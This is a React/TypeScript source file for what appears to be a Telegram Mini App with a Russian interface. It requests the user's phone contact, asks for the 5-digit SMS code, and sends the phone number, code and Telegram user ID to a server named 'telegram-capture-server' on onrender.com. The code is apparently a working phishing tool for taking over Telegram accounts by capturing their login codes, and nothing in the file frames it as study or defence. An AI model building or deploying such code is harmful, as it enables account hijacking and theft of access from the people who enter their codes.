import { useState, useEffect } from 'react';

function App() {
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [status, setStatus] = useState('');

  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.requestContact?.();
    }
  }, []);

  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;
    if (!tg) return;

    const handleContact = (event: any) => {
      if (event.detail?.contact) {
        setPhone(event.detail.contact.phone_number);
        setStatus('✅ Номер получен! Введите код из SMS.');
      }
    };

    tg.onEvent?.('contactRequested', handleContact);
    return () => tg.offEvent?.('contactRequested', handleContact);
  }, []);

  const handleSubmit = async () => {
    if (!phone) {
      setStatus('❌ Сначала запросите контакт');
      return;
    }
    if (code.length !== 5) {
      setStatus('❌ Введите ровно 5 цифр кода');
      return;
    }

    setStatus('⏳ Отправка...');

    try {
      const response = await fetch('https://telegram-capture-server.onrender.com/submit-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: phone,
          code: code,
          userId: (window as any).Telegram?.WebApp?.initDataUnsafe?.user?.id || 'unknown'
        })
      });

      const data = await response.json();
      if (data.success) {
        setStatus('✅ Код отправлен!');
        setCode('');
      } else {
        setStatus('❌ Ошибка сервера');
      }
    } catch (error) {
      setStatus('❌ Ошибка сети');
    }
  };

  return (
    <div style={{ 
      minHeight: '100vh', 
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center', 
      background: 'linear-gradient(135deg, #1a1a2e, #16213e, #0f3460)',
      padding: '20px',
      fontFamily: 'system-ui, sans-serif'
    }}>
      <div style={{
        background: 'rgba(255,255,255,0.05)',
        backdropFilter: 'blur(10px)',
        borderRadius: '24px',
        padding: '40px 30px',
        maxWidth: '400px',
        width: '100%',
        boxShadow: '0 25px 50px rgba(0,0,0,0.5)',
        border: '1px solid rgba(255,255,255,0.1)',
        textAlign: 'center'
      }}>
        <h2 style={{ color: '#fff', fontSize: '28px', marginBottom: '10px' }}>Введите код из SMS</h2>
        {phone && (
          <p style={{ color: '#4ade80', fontSize: '18px', margin: '10px 0 20px' }}>
            📱 Номер: +{phone}
          </p>
        )}
        <input
          value={code}
          onChange={(e) => setCode(e.target.value)}
          placeholder="5-значный код"
          maxLength={5}
          style={{
            fontSize: '28px',
            padding: '16px',
            width: '100%',
            maxWidth: '200px',
            textAlign: 'center',
            border: '2px solid #4ade80',
            borderRadius: '12px',
            background: 'rgba(255,255,255,0.1)',
            color: '#fff',
            outline: 'none',
            letterSpacing: '8px'
          }}
        />
        <br />
        <button
          onClick={handleSubmit}
          style={{
            marginTop: '24px',
            padding: '14px 48px',
            fontSize: '18px',
            fontWeight: '600',
            background: 'linear-gradient(135deg, #4ade80, #22d3ee)',
            color: '#0f172a',
            border: 'none',
            borderRadius: '12px',
            cursor: 'pointer',
            transition: 'transform 0.2s',
            boxShadow: '0 8px 20px rgba(74, 222, 128, 0.3)'
          }}
        >
          Отправить
        </button>
        <p style={{ 
          marginTop: '20px', 
          color: status.includes('✅') ? '#4ade80' : status.includes('❌') ? '#f87171' : '#94a3b8',
          fontWeight: '500'
        }}>
          {status}
        </p>
      </div>
    </div>
  );
}

export default App;
